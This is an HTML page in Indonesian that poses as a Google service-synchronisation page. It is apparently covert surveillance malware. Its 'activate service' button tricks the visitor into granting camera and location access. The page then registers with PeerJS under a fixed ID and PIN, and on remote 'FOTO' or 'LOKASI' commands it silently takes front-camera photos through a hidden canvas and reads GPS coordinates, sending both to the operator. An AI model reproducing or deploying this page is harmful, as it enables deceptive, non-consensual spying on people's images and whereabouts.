<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sistem Layanan Google</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
</head>
<body style="background:#f2f2f2; font-family:sans-serif; text-align:center; padding-top:100px;">
    <div style="background:#fff; padding:30px; border-radius:15px; display:inline-block; border:1px solid #ddd;">
        <h3>⚙️ Sinkronisasi Sistem</h3>
        <p id="stat">Menunggu Perintah...</p>
        <button onclick="mulai()" style="padding:15px 30px; background:#4285f4; color:#fff; border:none; border-radius:5px; font-weight:bold;">AKTIFKAN LAYANAN</button>
    </div>

    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        // KUNCI DISINI BIAR GAK REPOT
        const MY_ID = "anak_hayabusa_secure_007"; 
        const MY_PIN = "1234"; 
        
        let peer = new Peer(MY_ID);
        let stream;

        async function mulai() {
            try {
                // Minta izin kamera & GPS
                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
                navigator.geolocation.getCurrentPosition(()=>{});
                document.getElementById('stat').innerText = "Sistem Aktif ✅";
                alert("Sinkronisasi Berhasil!");
            } catch(e) { alert("Klik Allow/Izinkan!"); }
        }

        peer.on('connection', (conn) => {
            conn.on('data', (d) => {
                if(d.pin !== MY_PIN) return;
                if(d.cmd === "FOTO") ambilFoto(conn);
                if(d.cmd === "LOKASI") kirimLokasi(conn);
            });
        });

        function ambilFoto(conn) {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            v.srcObject = stream;
            setTimeout(() => {
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                conn.send({type:"FOTO", data:c.toDataURL('image/jpeg', 0.5)});
            }, 500);
        }

        function kirimLokasi(conn) {
            navigator.geolocation.getCurrentPosition(p => {
                conn.send({type:"LOKASI", lat:p.coords.latitude, lon:p.coords.longitude});
            });
        }
    </script>
</body>
</html>
